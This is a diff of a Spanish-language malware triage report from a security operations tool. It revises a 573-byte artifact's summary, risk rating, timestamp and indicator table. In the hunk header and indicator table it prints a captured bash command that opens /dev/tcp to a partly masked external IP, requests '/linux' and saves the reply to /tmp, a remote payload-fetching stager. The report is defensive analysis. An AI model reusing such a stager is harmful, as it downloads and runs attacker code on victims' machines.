@@ -4,16 +4,16 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto de 573 B. Formato identificado como ASCII text, with very long lines (571), with CRLF line terminators. Entropía registrada: 5.76. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
-- **Categoría:** `Payload`
 - **Riesgo:** `Medium`
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T20:34:59+00:00`
+- **Registrado:** `2026-08-09T20:34:59.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -50,8 +50,8 @@ system.exec "bash -c \"exec 6<>/dev/tcp/8.145.34.XXX/60106 && echo -n 'GET /linu
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
 | ip | 8.145.34.XXX | static_analysis |
-| hash | a2bb48d37a81837869842437dc5730ad3bb9bfe2fd1a2f42b7b3474fee1036a5 | static_analysis |
 | command | system.exec "bash -c \"exec 6<>/dev/tcp/8.145.34.XXX/60106 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/SCUxMcvnJ3 && | strings |
+| hash | a2bb48d37a81837869842437dc5730ad3bb9bfe2fd1a2f42b7b3474fee1036a5 | static_analysis |
 | ip | 101.126.159.XXX | artifact_source |
 
 ## 🔎 Triage
